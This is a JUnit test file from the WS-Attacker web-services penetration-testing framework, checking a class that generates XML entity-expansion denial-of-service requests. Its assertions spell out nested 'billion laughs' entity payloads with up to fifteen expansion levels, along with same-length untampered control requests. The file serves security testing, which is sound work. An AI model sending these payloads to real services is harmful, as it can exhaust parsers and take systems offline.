/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Christian Altmeier
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.intelligentdos.dos;

import javax.xml.parsers.ParserConfigurationException;
import static org.hamcrest.CoreMatchers.containsString;
import static org.hamcrest.CoreMatchers.is;
import static org.hamcrest.CoreMatchers.startsWith;
import static org.junit.Assert.assertThat;
import org.junit.Test;
import wsattacker.library.intelligentdos.dos.DoSAttack.PayloadPosition;
import wsattacker.library.intelligentdos.helper.IterateModel;
import wsattacker.library.intelligentdos.helper.IterateModel.IterateStrategie;
import wsattacker.testhelper.IDoSTestHelper;

/**
 * @author Christian Altmeier
 */
public class XmlEntityExpansionTest
{

    private final XmlEntityExpansion xmlEntityExpansion = new XmlEntityExpansion();

    @Test
    public void hasFurther()
    {
        assertThat( xmlEntityExpansion.hasFurtherParams(), is( true ) );
    }

    @Test
    public void oneParam()
    {
        // elements
        IterateModel iterateModel = IterateModel.custom().startAt( 2 ).stopAt( 2 ).build();
        xmlEntityExpansion.setNumberOfEntityElementsIterator( iterateModel );
        // entities
        iterateModel = IterateModel.custom().startAt( 2 ).stopAt( 2 ).build();
        xmlEntityExpansion.setNumberOfEntitiesIterator( iterateModel );

        assertThat( xmlEntityExpansion.hasFurtherParams(), is( true ) );
        xmlEntityExpansion.nextParam();
        assertThat( xmlEntityExpansion.hasFurtherParams(), is( false ) );
    }

    @Test
    public void twoTwo()
    {
        // elements
        IterateModel iterateModel = IterateModel.custom().startAt( 2 ).stopAt( 4 ).setIncrement( 2 ).build();
        xmlEntityExpansion.setNumberOfEntityElementsIterator( iterateModel );
        // entities
        iterateModel = IterateModel.custom().startAt( 2 ).stopAt( 4 ).setIncrement( 2 ).build();
        xmlEntityExpansion.setNumberOfEntitiesIterator( iterateModel );

        for ( int i = 0; i < 4; i++ )
        {
            assertThat( xmlEntityExpansion.hasFurtherParams(), is( true ) );
            xmlEntityExpansion.nextParam();
        }

        assertThat( xmlEntityExpansion.hasFurtherParams(), is( false ) );
    }

    @Test( expected = IllegalArgumentException.class )
    public void notAllowedPayloadPosition()
    {
        IterateModel iterateModel = IterateModel.custom().startAt( 2 ).stopAt( 2 ).build();
        xmlEntityExpansion.setNumberOfEntityElementsIterator( iterateModel );
        assertThat( xmlEntityExpansion.hasFurtherParams(), is( true ) );
        xmlEntityExpansion.nextParam();

        xmlEntityExpansion.getTamperedRequest( "", PayloadPosition.ATTRIBUTE );
    }

    @Test
    public void tampered()
        throws ParserConfigurationException
    {

        PayloadPosition payloadPosition = PayloadPosition.ELEMENT;

        String xml = IDoSTestHelper.createTestString( payloadPosition );

        // Iterate
        // elements
        IterateModel iterateModel =
            IterateModel.custom().startAt( 4 ).stopAt( 16 ).setIncrement( 4 ).setIterateStrategie( IterateStrategie.MUL ).build();
        xmlEntityExpansion.setNumberOfEntityElementsIterator( iterateModel );
        // entities
        iterateModel =
            IterateModel.custom().startAt( 4 ).stopAt( 16 ).setIncrement( 4 ).setIterateStrategie( IterateStrategie.MUL ).build();
        xmlEntityExpansion.setNumberOfEntitiesIterator( iterateModel );
        assertThat( xmlEntityExpansion.hasFurtherParams(), is( true ) );
        xmlEntityExpansion.nextParam();

        String start = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE Envelope [<!ENTITY x0 \"";
        String tampered =
            "\"><!ENTITY x1 \"&x0;&x0;&x0;&x0;\"><!ENTITY x2 \"&x1;&x1;&x1;&x1;\"><!ENTITY x3 \"&x2;&x2;&x2;&x2;\">]>";
        String tamperedRequest = xmlEntityExpansion.getTamperedRequest( xml, payloadPosition );

        assertThat( tamperedRequest, startsWith( start ) );
        assertThat( tamperedRequest.substring( 73 ), startsWith( tampered ) );
        assertThat( tamperedRequest, containsString( "><s>&x3;</s></" ) );

        assertThat( xmlEntityExpansion.hasFurtherParams(), is( true ) );
        xmlEntityExpansion.nextParam();

        tampered =
            "\">" + "<!ENTITY x1 \"&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;\">"
                + "<!ENTITY x2 \"&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;\">"
                + "<!ENTITY x3 \"&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;\">]>";
        tamperedRequest = xmlEntityExpansion.getTamperedRequest( xml, payloadPosition );
        assertThat( tamperedRequest, startsWith( start ) );
        assertThat( tamperedRequest.substring( 73 ), startsWith( tampered ) );
        assertThat( tamperedRequest, containsString( "><s>&x3;</s></" ) );

        assertThat( xmlEntityExpansion.hasFurtherParams(), is( true ) );
        xmlEntityExpansion.nextParam();

        tampered =
            "\">" + "<!ENTITY x1 \"&x0;&x0;&x0;&x0;\"><!ENTITY x2 \"&x1;&x1;&x1;&x1;\">"
                + "<!ENTITY x3 \"&x2;&x2;&x2;&x2;\"><!ENTITY x4 \"&x3;&x3;&x3;&x3;\">"
                + "<!ENTITY x5 \"&x4;&x4;&x4;&x4;\"><!ENTITY x6 \"&x5;&x5;&x5;&x5;\">"
                + "<!ENTITY x7 \"&x6;&x6;&x6;&x6;\"><!ENTITY x8 \"&x7;&x7;&x7;&x7;\">"
                + "<!ENTITY x9 \"&x8;&x8;&x8;&x8;\"><!ENTITY x10 \"&x9;&x9;&x9;&x9;\">"
                + "<!ENTITY x11 \"&x10;&x10;&x10;&x10;\"><!ENTITY x12 \"&x11;&x11;&x11;&x11;\">"
                + "<!ENTITY x13 \"&x12;&x12;&x12;&x12;\"><!ENTITY x14 \"&x13;&x13;&x13;&x13;\">"
                + "<!ENTITY x15 \"&x14;&x14;&x14;&x14;\">" + "]>";
        tamperedRequest = xmlEntityExpansion.getTamperedRequest( xml, payloadPosition );
        assertThat( tamperedRequest, startsWith( start ) );
        assertThat( tamperedRequest.substring( 73 ), startsWith( tampered ) );
        assertThat( tamperedRequest, containsString( "><s>&x15;</s></" ) );

        assertThat( xmlEntityExpansion.hasFurtherParams(), is( true ) );
        xmlEntityExpansion.nextParam();

        tampered =
            "\">" + "<!ENTITY x1 \"&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;\">"
                + "<!ENTITY x2 \"&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;\">"
                + "<!ENTITY x3 \"&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;\">"
                + "<!ENTITY x4 \"&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;\">"
                + "<!ENTITY x5 \"&x4;&x4;&x4;&x4;&x4;&x4;&x4;&x4;&x4;&x4;&x4;&x4;&x4;&x4;&x4;&x4;\">"
                + "<!ENTITY x6 \"&x5;&x5;&x5;&x5;&x5;&x5;&x5;&x5;&x5;&x5;&x5;&x5;&x5;&x5;&x5;&x5;\">"
                + "<!ENTITY x7 \"&x6;&x6;&x6;&x6;&x6;&x6;&x6;&x6;&x6;&x6;&x6;&x6;&x6;&x6;&x6;&x6;\">"
                + "<!ENTITY x8 \"&x7;&x7;&x7;&x7;&x7;&x7;&x7;&x7;&x7;&x7;&x7;&x7;&x7;&x7;&x7;&x7;\">"
                + "<!ENTITY x9 \"&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;\">"
                + "<!ENTITY x10 \"&x9;&x9;&x9;&x9;&x9;&x9;&x9;&x9;&x9;&x9;&x9;&x9;&x9;&x9;&x9;&x9;\">"
                + "<!ENTITY x11 \"&x10;&x10;&x10;&x10;&x10;&x10;&x10;&x10;&x10;&x10;&x10;&x10;&x10;&x10;&x10;&x10;\">"
                + "<!ENTITY x12 \"&x11;&x11;&x11;&x11;&x11;&x11;&x11;&x11;&x11;&x11;&x11;&x11;&x11;&x11;&x11;&x11;\">"
                + "<!ENTITY x13 \"&x12;&x12;&x12;&x12;&x12;&x12;&x12;&x12;&x12;&x12;&x12;&x12;&x12;&x12;&x12;&x12;\">"
                + "<!ENTITY x14 \"&x13;&x13;&x13;&x13;&x13;&x13;&x13;&x13;&x13;&x13;&x13;&x13;&x13;&x13;&x13;&x13;\">"
                + "<!ENTITY x15 \"&x14;&x14;&x14;&x14;&x14;&x14;&x14;&x14;&x14;&x14;&x14;&x14;&x14;&x14;&x14;&x14;\">"
                + "]>";
        tamperedRequest = xmlEntityExpansion.getTamperedRequest( xml, payloadPosition );
        assertThat( tamperedRequest, startsWith( start ) );
        assertThat( tamperedRequest.substring( 73 ), startsWith( tampered ) );
        assertThat( tamperedRequest, containsString( "><s>&x15;</s></" ) );

        assertThat( xmlEntityExpansion.hasFurtherParams(), is( false ) );
    }

    @Test
    public void untampered()
        throws ParserConfigurationException
    {
        PayloadPosition payloadPosition = PayloadPosition.ELEMENT;

        String xml = IDoSTestHelper.createTestString( payloadPosition );

        // Iterate
        // elements
        IterateModel iterateModel =
            IterateModel.custom().startAt( 4 ).stopAt( 16 ).setIncrement( 4 ).setIterateStrategie( IterateStrategie.MUL ).build();
        xmlEntityExpansion.setNumberOfEntityElementsIterator( iterateModel );
        // entities
        iterateModel =
            IterateModel.custom().startAt( 4 ).stopAt( 16 ).setIncrement( 4 ).setIterateStrategie( IterateStrategie.MUL ).build();
        xmlEntityExpansion.setNumberOfEntitiesIterator( iterateModel );
        assertThat( xmlEntityExpansion.hasFurtherParams(), is( true ) );
        xmlEntityExpansion.nextParam();

        String tamperedRequest = xmlEntityExpansion.getTamperedRequest( xml, payloadPosition );
        String untamperedRequest = xmlEntityExpansion.getUntamperedRequest( xml, payloadPosition );

        String referece =
            "><!-- ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "cccccccccccccccccccccc --></";
        assertThat( untamperedRequest, containsString( referece ) );

        // Test length
        assertThat( untamperedRequest.length(), is( tamperedRequest.length() ) );

        assertThat( xmlEntityExpansion.hasFurtherParams(), is( true ) );
        xmlEntityExpansion.nextParam();

        tamperedRequest = xmlEntityExpansion.getTamperedRequest( xml, payloadPosition );
        untamperedRequest = xmlEntityExpansion.getUntamperedRequest( xml, payloadPosition );

        referece =
            "><!-- ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "cccccccccccc --></";
        assertThat( untamperedRequest, containsString( referece ) );

        // Test length
        assertThat( untamperedRequest.length(), is( tamperedRequest.length() ) );

        assertThat( xmlEntityExpansion.hasFurtherParams(), is( true ) );
        xmlEntityExpansion.nextParam();

        tamperedRequest = xmlEntityExpansion.getTamperedRequest( xml, payloadPosition );
        untamperedRequest = xmlEntityExpansion.getUntamperedRequest( xml, payloadPosition );

        referece =
            "><!-- ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "cccccccccccccccccccccccccccccccccccc --></";
        assertThat( untamperedRequest, containsString( referece ) );

        // Test length
        assertThat( untamperedRequest.length(), is( tamperedRequest.length() ) );

        assertThat( xmlEntityExpansion.hasFurtherParams(), is( true ) );
        xmlEntityExpansion.nextParam();

        tamperedRequest = xmlEntityExpansion.getTamperedRequest( xml, payloadPosition );
        untamperedRequest = xmlEntityExpansion.getUntamperedRequest( xml, payloadPosition );

        referece =
            "><!-- ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                + "cccccccccccccccccccccccccccccccccccccccccccccc --></";
        assertThat( untamperedRequest, containsString( referece ) );

        // Test length
        assertThat( untamperedRequest.length(), is( tamperedRequest.length() ) );

        assertThat( xmlEntityExpansion.hasFurtherParams(), is( false ) );
    }
}
